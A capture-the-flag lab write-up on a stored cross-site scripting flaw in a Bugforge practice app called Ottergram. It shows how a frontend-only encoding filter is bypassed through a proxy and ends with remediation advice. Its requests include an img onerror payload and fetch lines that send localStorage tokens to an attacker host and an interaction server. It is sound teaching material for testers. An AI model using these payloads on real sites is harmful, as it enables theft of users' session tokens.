---
title: Bugforge - Ottergram - Stored XSS
author: tom
tags:
  - xss
date: 2025-12-02T17:00:00
description: Bypassing a frontend filter to achieve cross-site scripting and exfiltrate sensitive data from a victim user's local browser storage.
image: /assets/img/ottergram-xss-thumbnail.png
categories:
  - writeups
  - bugforge
---
## Description

This version of Ottergram is an easy rated lab on [bugforge.io](https://bugforge.io). The lab involves finding and abusing a flawed user input validation mechanism to achieve cross-site scripting, and subsequently sending an XSS payload to a victim to exfiltrate sensitive data using the Fetch API.

## Attack Path

Note that when sending an XSS payload from the browser, the message is encoded prior to sending, resulting in the HTML not being rendered in the resulting message. The following request shows that the message is **SENT** encoded:

```
POST /api/messages HTTP/1.1
Host: 91dd467df2c6.labs.bugforge.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJ0ZXN0ZXIxIiwiaWF0IjoxNzY0Njg1MDM5fQ.utaeJn4g6wMPqQGfsV1qyxl4SNknR5uZpTsPZSURsQg
Content-Length: 59
Origin: <https://91dd467df2c6.labs.bugforge.io>
Connection: keep-alive
Referer: <https://91dd467df2c6.labs.bugforge.io/messages>
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: magenta
Priority: u=0

{"recipient_id":4,"content":"&lt;s&gt;test&lt;&#x2F;s&gt;"}
```

![](assets/img/2025-12-02-ottergram-stored-xss/file-20251202165824514.png){: .shadow .rounded-corners }
_Initial payload is filtered_

Seeing the encoded characters (`&lt;` and `&gt;`) in the proxy is an indicator that the input is being encoded by the frontend code. In this case, the code that performs the encoding is in `Messages.js`, as shown below:

![](assets/img/2025-12-02-ottergram-stored-xss/file-20251202165909378.png){: .shadow .rounded-corners }
_Frontend encoding function_

However, if we send a benign message to replay and add the HTML tags in the proxy, the frontend filter is bypassed and our HTML renders. This indicates that the input is not being filtered on the backend, so we’ve found a bypass!

![](assets/img/2025-12-02-ottergram-stored-xss/file-20251202165956540.png){: .shadow .rounded-corners }
_Modifying the payload in Caido to bypass the frontend code_

![](assets/img/2025-12-02-ottergram-stored-xss/file-20251202170038870.png){: .shadow .rounded-corners }
_HTML is now rendered properly in the victim's inbox_

Now that we’re able to render HTML in the victim’s browser, we can start developing a working XSS payload.

Sending the following request does indeed trigger a working XSS payload in the victim’s browser:

```
POST /api/messages HTTP/1.1
Host: 49eaced97d43.labs.bugforge.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0ZXIxIiwiaWF0IjoxNzY0NjkzMTgxfQ.mv798toO-Hp816AOwFb8OaiQIl8oZWhfO1PQuJgTG4s
Content-Length: 35
Origin: <https://49eaced97d43.labs.bugforge.io>
Connection: keep-alive
Referer: <https://49eaced97d43.labs.bugforge.io/messages>
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: magenta
Priority: u=0

{"recipient_id":5,"content":"test<img src=x onerror=alert('xss')>"}
```

![](assets/img/2025-12-02-ottergram-stored-xss/file-20251202170131769.png){: .shadow .rounded-corners }
_XSS payload executing in the victim's browser_

Awesome, now we can start working on a payload to steal the victim’s data. I’m using the QuickSSRF plugin in Caido for this with an Interactsh URL.

The easiest way (for me) to do this is with the Fetch API. The general format of this request is like this:

```
fetch('<https://attacker-site.net/x?c='+localStorage.getItem('token>'))
```

Sending the following `POST` request to send a message to the admin user triggers a request to our server:

```
POST /api/messages HTTP/1.1
Host: 49eaced97d43.labs.bugforge.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0ZXIxIiwiaWF0IjoxNzY0NjkzMTgxfQ.mv798toO-Hp816AOwFb8OaiQIl8oZWhfO1PQuJgTG4s
Content-Length: 38
Origin: <https://49eaced97d43.labs.bugforge.io>
Connection: keep-alive
Referer: <https://49eaced97d43.labs.bugforge.io/messages>
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: magenta
Priority: u=0

{"recipient_id":2,"content":"<img src=x onerror=fetch('<https://t29svkt1pgfke0mui2maadc68p0gbwrpy.oast.site/x?c='+localStorage.getItem('flag>'))>"}
```

After a minute or so we get the flag in a `GET` request from the victim containing the flag.

![](assets/img/2025-12-02-ottergram-stored-xss/file-20251202170222409.png){: .shadow .rounded-corners }
_Exfiltrating the flag from the admin's browser_

## Impact

An attacker who can inject malicious JavaScript code into a message sent to another user may be able to exfiltrate sensitive data from the Local Storage of the victim’s browser, or perform any other action that can be performed by JavaScript.

## Recommendation

User input should be validated and sanitized on the server since client-side controls can be bypassed. Implement server-side input validation to sanitize potentially malicious content, and apply HTML entity output encoding when rendering user-controlled data in HTML contexts. Additionally, consider implementing a Content Security Policy as an additional layer of defense-in-depth.

## Key Takeaway

It is common for frontend frameworks to apply some kind of filtering to user input. If you see this during a test, always make sure to check that filtering is applied on the backend as well. If it is not, then it’s likely the frontend controls can be bypassed, leading to XSS or other bad things.

## References

- [PortSwigger - Cross-Site Scripting](https://portswigger.net/web-security/cross-site-scripting)